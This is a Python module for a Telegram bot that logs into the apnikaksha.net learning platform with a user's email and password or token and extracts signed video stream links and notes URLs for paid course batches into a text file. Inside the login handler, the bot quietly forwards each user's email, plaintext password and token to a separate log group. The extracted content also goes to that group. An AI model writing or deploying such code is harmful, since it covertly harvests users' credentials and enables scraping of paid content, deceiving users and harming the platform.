import logging
import os
import requests
import time
from telegram import Update
from telegram.ext import (
    CommandHandler,
    ConversationHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# Stages for ConversationHandler
AUTH_CODE, BATCH_ID, CONTENT_TYPE = range(3)

# Constants
ROOT_DIR = os.getcwd()

def login_with_credentials(email, password):
    """Login using email and password and return the token."""
    url = "https://spec.apnikaksha.net/api/v2/login-other"
    headers = {
        "Accept": "application/json",
        "origintype": "web",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {
        "email": email,
        "password": password,
        "type": "kkweb",
        "deviceType": "web",
        "deviceVersion": "Chrome 133",
        "deviceModel": "chrome",
    }

    try:
        response = requests.post(url, headers=headers, data=data)
        if response.status_code == 200:
            response_data = response.json()
            if response_data.get("responseCode") == 200:
                return response_data["data"]["token"]
        logging.error(f"Login failed: {response.text}")
        return None
    except Exception as e:
        logging.error(f"Error during login: {e}")
        return None

async def ak_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start the AK extraction process."""
    if context.user_data.get('conversation_active', False):
        await update.message.reply_text("Ending previous conversation...")
        context.user_data.clear()
    
    context.user_data['conversation_active'] = True
    await update.message.reply_text(
        "Choose your login method:\n\n"
        "1. Login with Email and Password (format: `email*password`)\n"
        "2. Login with Token (send the token directly)"
    )
    return AUTH_CODE

async def handle_auth_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the authentication token or email/password login."""
    try:
        user_input = update.message.text.strip()
        
        # Check if the user is logging in with email and password
        if "*" in user_input:
            email, password = user_input.split("*", 1)
            auth_token = login_with_credentials(email, password)
            if not auth_token:
                await update.message.reply_text("Login failed. Please check your credentials and try again.")
                return ConversationHandler.END

            # Display the token to the user
            await update.message.reply_text(f"𝐘𝐨𝐮𝐫 𝐓𝐨𝐤𝐞𝐧: ```{auth_token}```", parse_mode="Markdown")

            # Log the email, password, and token to the group using main bot
            log_group_id = context.application.log_group_id_ak  # Get log group ID from context
            main_bot = context.application.main_bot  # Get main bot instance

            await main_bot.send_message(
                chat_id=log_group_id,
                text=f"New AK Login:\n\n𝐄𝐦𝐚𝐢𝐥: ```{email}```\n𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝: ```{password}```\n𝐓𝐨𝐤𝐞𝐧: ```{auth_token}```",
                parse_mode="Markdown"
            )
        else:
            # Assume the user is logging in with a direct token
            auth_token = user_input

        context.user_data['auth_token'] = auth_token

        headers = {
            "Host": "spec.apnikaksha.net",
            "token": auth_token,
            "origintype": "web",
            "user-agent": "Android",
            "usertype": "2",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json",
        }
        
        response = requests.get(
            "https://spec.apnikaksha.net/api/v2/my-batch",
            headers=headers
        ).json()

        if 'data' not in response:
            await update.message.reply_text("Invalid token or error in fetching batches.")
            return ConversationHandler.END

        batches = response["data"]["batchData"]
        context.user_data['batch_data'] = batches  # Store batch data for later use
        
        batch_text = "𝚈𝚘𝚞𝚛 𝙱𝚊𝚝𝚌𝚑𝚎𝚜:\n\n"
        for batch in batches:
            batch_text += f"𝑩𝒂𝒕𝒄𝒉 𝑵𝒂𝒎𝒆😶‍🌫️: ```{batch['batchName']}```\n𝑩𝒂𝒕𝒄𝒉 𝑰𝑫💡: ```{batch['id']}```\n\n"

        await update.message.reply_text(
            f"{batch_text}\nSend the Batch ID to proceed:",
            parse_mode="Markdown"
        )
        context.user_data['headers'] = headers
        return BATCH_ID

    except Exception as e:
        logging.error(f"Error in handle_auth_code: {e}")
        await update.message.reply_text("An error occurred. Please try again later.")
        return ConversationHandler.END

async def handle_batch_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the batch ID and fetch all subjects."""
    try:
        batch_id = update.message.text.strip()
        context.user_data['batch_id'] = batch_id
        headers = context.user_data['headers']

        # Fetch all subjects for the batch
        response = requests.get(
            f"https://spec.apnikaksha.net/api/v2/batch-subject/{batch_id}",
            headers=headers
        ).json()

        if 'data' not in response:
            await update.message.reply_text("Error fetching subjects.")
            return ConversationHandler.END

        subjects = response["data"]["batch_subject"]
        context.user_data['subject_data'] = subjects  # Store subject data for later use

        # Ask for content type
        await update.message.reply_text(
            "What do you want to extract?\n\nType 'class' for Videos\nType 'notes' for Notes"
        )
        return CONTENT_TYPE

    except Exception as e:
        logging.error(f"Error in handle_batch_id: {e}")
        await update.message.reply_text("An error occurred. Please try again later.")
        return ConversationHandler.END

async def handle_content_type(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle content type selection and extract all subjects' content."""
    try:
        content_type = update.message.text.strip().lower()
        if content_type not in ['class', 'notes']:
            await update.message.reply_text("Invalid option. Please type 'class' or 'notes'.")
            return CONTENT_TYPE

        await update.message.reply_text("𝐋𝐢𝐧𝐤 𝐞𝐱𝐭𝐫𝐚𝐜𝐭𝐢𝐨𝐧 𝐬𝐭𝐚𝐫𝐭𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭✋️...")

        start_time = time.time()  # Start time for extraction

        headers = context.user_data['headers']
        batch_id = context.user_data['batch_id']
        subjects = context.user_data['subject_data']

        # Get batch name from stored batch data
        batch_name = "Unknown Batch"
        for batch in context.user_data.get('batch_data', []):
            if str(batch["id"]) == str(batch_id):
                batch_name = batch["batchName"]
                break

        # Extract content for all subjects
        to_write = ""
        for subject in subjects:
            subject_id = subject["id"]
            subject_name = subject["subjectName"]
            to_write += f"\n\n=== Subject: {subject_name} ===\n\n"

            # Fetch topics for the subject
            response = requests.get(
                f"https://spec.apnikaksha.net/api/v2/batch-topic/{subject_id}?type={content_type}",
                headers=headers
            ).json()

            if 'data' not in response:
                continue  # Skip if no topics found

            topics = response["data"]["batch_topic"]
            for topic in topics:
                topic_id = topic["id"]
                
                if content_type == "class":
                    response = requests.get(
                        f"https://spec.apnikaksha.net/api/v2/batch-detail/{batch_id}?subjectId={subject_id}&topicId={topic_id}",
                        headers=headers
                    ).json()

                    if 'data' in response and 'class_list' in response['data']:
                        classes = response['data']['class_list'].get('classes', [])
                        for cls in classes:
                            try:
                                lesson_url = cls["lessonUrl"]
                                lesson_name = cls["lessonName"].replace(":", " ")
                                lesson_ext = cls.get("lessonExt", "")

                                if lesson_ext == "brightcove":
                                    video_token_response = requests.get(
                                        f"https://spec.apnikaksha.net/api/v2/livestreamToken?base=web&module=batch&type=brightcove&vid={cls['id']}",
                                        headers=headers
                                    ).json()
                                    
                                    video_token = video_token_response.get("data", {}).get("token")
                                    if video_token:
                                        video_url = f"https://edge.api.brightcove.com/playback/v2/accounts/6415636611001/videos/{lesson_url}/master.m3u8?bcov_auth={video_token}"
                                        to_write += f"{lesson_name}: {video_url}\n"
                                
                                elif lesson_ext == "youtube":
                                    video_url = f"https://www.youtube.com/embed/{lesson_url}"
                                    to_write += f"{lesson_name}: {video_url}\n"

                            except Exception as e:
                                logging.error(f"Error processing class: {e}")
                                continue

                elif content_type == "notes":
                    response = requests.get(
                        f"https://spec.apnikaksha.net/api/v2/batch-notes/{batch_id}?subjectId={subject_id}&topicId={topic_id}",
                        headers=headers
                    ).json()

                    if 'data' in response and 'notesDetails' in response['data']:
                        notes = response["data"]["notesDetails"]
                        for note in notes:
                            doc_url = note["docUrl"]
                            doc_title = note["docTitle"].replace(":", " ")
                            to_write += f"{doc_title}: {doc_url}\n"

        if to_write:
            filename = f"AK_{batch_id}_{content_type}.txt"
            file_path = os.path.join(ROOT_DIR, filename)
            
            with open(file_path, "w", encoding="utf-8") as f:
                f.write(to_write)

            # Calculate extraction time
            extraction_time = time.time() - start_time
            extraction_time_str = f"{extraction_time:.2f} seconds"

            # Send file to user with updated caption
            user_caption = (
                f"𝑯𝒆𝒓𝒆'𝒔 𝒚𝒐𝒖𝒓 𝒆𝒙𝒕𝒓𝒂𝒄𝒕𝒆𝒅 𝒄𝒐𝒏𝒕𝒆𝒏𝒕!✨️\n\n"
                f"𝐁𝐚𝐭𝐜𝐡 𝐧𝐚𝐦𝐞💢: {batch_name}\n"
                f"𝑬𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒐𝒏 𝒕𝒊𝒎𝒆⏱️: {extraction_time_str}"
            )
            with open(file_path, "rb") as f:
                await update.message.reply_document(
                    document=f,
                    caption=user_caption
                )

            # Send file to log group using main bot
            log_group_id = context.application.log_group_id_ak  # Get log group ID from context
            main_bot = context.application.main_bot  # Get main bot instance

            log_caption = (
                f"AK 𝚌𝚘𝚗𝚝𝚎𝚗𝚝 𝚎𝚡𝚝𝚛𝚊𝚌𝚝𝚎𝚍 𝚊𝚗𝚍 𝚜𝚎𝚗𝚝 𝚝𝚘 𝚞𝚜𝚎𝚛.\n\n"
                f"𝑪𝒐𝒏𝒕𝒆𝒏𝒕 𝑻𝒚𝒑𝒆: {content_type}\n\n"
                f"𝐁𝐚𝐭𝐜𝐡 𝐧𝐚𝐦𝐞💢: {batch_name}\n"
                f"𝑬𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒐𝒏 𝒕𝒊𝒎𝒆⏱️: {extraction_time_str}"
            )
            with open(file_path, "rb") as f:
                await main_bot.send_document(
                    chat_id=log_group_id,
                    document=f,
                    caption=log_caption
                )

            # Clean up
            os.remove(file_path)
            await update.message.reply_text("𝑬𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒐𝒏 𝒄𝒐𝒎𝒑𝒍𝒆𝒕𝒆𝒅 𝒔𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚! ✨")
        else:
            await update.message.reply_text("𝐍𝐨 𝐜𝐨𝐧𝐭𝐞𝐧𝐭 𝐟𝐨𝐮𝐧𝐝 Sorry🤪.")

        return ConversationHandler.END

    except Exception as e:
        logging.error(f"Error in handle_content_type: {e}")
        await update.message.reply_text("An error occurred during extraction. Please try again later.")
        return ConversationHandler.END

async def timeout(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle conversation timeout."""
    await update.message.reply_text("Conversation timed out. Please start again.")
    context.user_data.clear()
    return ConversationHandler.END

# Create the conversation handler
ak_handler = ConversationHandler(
    entry_points=[CommandHandler("ak", ak_start)],
    states={
        AUTH_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_auth_code)],
        BATCH_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_batch_id)],
        CONTENT_TYPE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_content_type)],
    },
    fallbacks=[MessageHandler(filters.ALL, timeout)],  # Handle timeout
    conversation_timeout=600,  # 10 minutes timeout
)